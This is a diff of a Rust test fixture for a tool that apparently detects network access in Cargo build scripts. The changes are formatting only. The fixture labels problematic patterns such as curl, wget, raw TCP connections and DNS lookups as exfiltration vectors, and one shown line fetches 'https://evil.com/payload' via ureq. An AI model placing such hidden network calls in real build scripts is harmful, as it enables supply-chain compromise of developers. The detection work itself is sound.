@@ -7,9 +7,9 @@
 //!
 //! Expected: 10 PROBLEMATIC patterns detected
 
-use std::process::Command;
-use std::net::TcpStream;
 use std::io::{Read, Write};
+use std::net::TcpStream;
+use std::process::Command;
 
 fn main() {
     // ========================================================================
@@ -18,41 +18,41 @@ fn main() {
 
     // PROBLEMATIC: Direct network request with reqwest
     bad_reqwest_get();
-    
-    // PROBLEMATIC: Direct network request with ureq  
+
+    // PROBLEMATIC: Direct network request with ureq
     bad_ureq_get();
-    
+
     // PROBLEMATIC: Raw TCP connection
     bad_tcp_connect();
-    
+
     // PROBLEMATIC: Command that does network access
     bad_curl_command();
-    
+
     // PROBLEMATIC: wget command
     bad_wget_command();
-    
+
     // PROBLEMATIC: git clone from network
     bad_git_clone();
-    
+
     // PROBLEMATIC: HTTP download via process
     bad_http_download();
-    
+
     // PROBLEMATIC: DNS lookup (data exfiltration vector)
     bad_dns_lookup();
-    
+
     // ========================================================================
     // SAFE PATTERNS - Legitimate build script operations
     // ========================================================================
-    
+
     // SAFE: Running local compiler tools
     safe_local_command();
-    
+
     // SAFE: File system operations
     safe_file_operations();
-    
+
     // SAFE: Printing cargo instructions
     safe_cargo_println();
-    
+
     // SAFE: Environment variable access
     safe_env_access();
 }
@@ -67,7 +67,7 @@ fn bad_reqwest_get() {
 }
 
 fn bad_ureq_get() {
-    // PROBLEMATIC: Network request in build script  
+    // PROBLEMATIC: Network request in build script
     let _response = ureq::get("https://evil.com/payload").call();
 }
 
@@ -124,11 +124,8 @@ fn bad_dns_lookup() {
 
 fn safe_local_command() {
     // SAFE: Running local build tools
-    Command::new("rustc")
-        .args(["--version"])
-        .output()
-        .ok();
-        
+    Command::new("rustc").args(["--version"]).output().ok();
+
     Command::new("cc")
         .args(["-c", "native/lib.c"])
         .output()
